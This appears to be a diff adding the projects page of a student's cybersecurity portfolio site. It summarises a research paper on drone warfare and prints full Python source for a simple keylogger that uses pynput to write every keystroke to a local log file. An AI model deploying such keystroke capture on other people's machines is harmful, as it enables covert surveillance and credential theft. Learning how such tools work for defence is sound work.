@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lukas Schou | Cybersecurity Personal Portfolio</title>
+    <meta name="description" content="Portfolio of Lukas Schou, showcasing cybersecurity projects, experience, and skills">
+    <link rel="icon" href="favicon.io">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css">
+    <meta property="og:title" content="Lukas Schou Portfolio">
+    <meta property="og:description" content="Cybersecurity Portfolio">
+    <meta property="og:type" content="website">
+</head>
+
+<body>
+    <nav class="navbar">
+        <ul class="nav-links">
+            <li><a href="index.html">Home</a></li>
+            <li><a href="education.html">Education</a></li>
+            <li><a href="skills.html">Skills</a></li>
+            <li><a href="projects.html">Projects</a></li>
+            <li><a href="experience.html">Experience</a></li>
+            <li><a href="contact.html">Contact</a></li>
+        </ul>
+    </nav>
+
+    <main class="projects-page">
+        <h1 class="section-title">Projects</h1>
+        <h2>Usage of Drones In The Israel and Palestine Conflcit</h2>
+        <p>A research paper that goes over the usage of drones in the Israel and Palestine confilct as well as how drones are used to dehumainze people in many different scenarios and also go into different violent non-state actors (VNSAs) who also use drone warfare.</p>
+        <a href="paper.pdf" target="_blank">Open the paper in a new tab</a>
+        <h2><br>Key Logger</h2>
+        <h3>*USED FOR ETHICAL PURPOSES*</h3>
+        <p>This a python script I did in order to make a key logger that will record your keyboard inputs and put the inputs into a different CSV file.</p>
+        <h2>Code:</h2>
+        <pre><code>from pynput import keyboard
+
+def on_press(key):
+    try:
+        with open("log.txt", 'a') as log_file:
+            log_file.write(f"{key}\n")
+    except Exception as e:
+        print(f"Write error: {e}")
+        
+    if key == keyboard.Key.esc:
+        print("\n[!] Listener stopped")
+        return False
+    
+def main():
+    print("[+] Listener running... (press ESC to stop)")
+    with keyboard.Listener(on_press=on_press) as listner:
+        listner.join()
+        
+if __name__ == "__main__":
+    main()</code></pre>
+    </main>
+
+    <footer>
+        <p class="footer">&copy Lukas Schou 2026</p>
+    </footer>
+</body>
+
+
+</html>
